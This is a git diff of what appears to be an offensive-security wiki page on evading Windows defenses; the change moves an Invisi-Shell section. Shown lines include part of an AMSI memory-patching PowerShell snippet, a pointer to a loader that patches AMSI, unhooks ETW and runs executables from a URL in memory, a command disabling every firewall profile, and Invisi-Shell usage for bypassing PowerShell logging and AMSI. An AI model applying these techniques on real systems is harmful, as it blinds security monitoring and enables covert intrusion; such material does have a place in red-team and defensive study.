@@ -51,7 +51,27 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 ```
 
-## Loader
+### Invisi-Shell
+
+{% embed url="https://github.com/OmerYa/Invisi-Shell" %}
+
+Invisi-Shell bypasses all of PowerShell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking&#x20;
+
+Usage
+
+```powershell
+# With admin privileges:
+RunWithPathAsAdmin.bat 
+
+# More Silent
+# With non-admin privileges:
+RunWithRegistryNonAdmin.bat
+
+# Type exit from the new PowerShell session to complete the clean-up.
+exit
+```
+
+### Loader
 
 use [`NetLoader` ](https://github.com/Flangvik/NetLoader)to unhook ETW and patch AMSI then run executable from URL without saving
 
@@ -94,26 +114,6 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Disable manually
 
 <figure><img src="../.gitbook/assets/disable-firewall.png" alt=""><figcaption></figcaption></figure>
-
-## Invisi-Shell
-
-{% embed url="https://github.com/OmerYa/Invisi-Shell" %}
-
-Invisi-Shell bypasses all of PowerShell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking&#x20;
-
-Usage
-
-```powershell
-# With admin privileges:
-RunWithPathAsAdmin.bat 
-
-# More Silent
-# With non-admin privileges:
-RunWithRegistryNonAdmin.bat
-
-# Type exit from the new PowerShell session to complete the clean-up.
-exit
-```
 
 ## AV Signatures Bypass
 
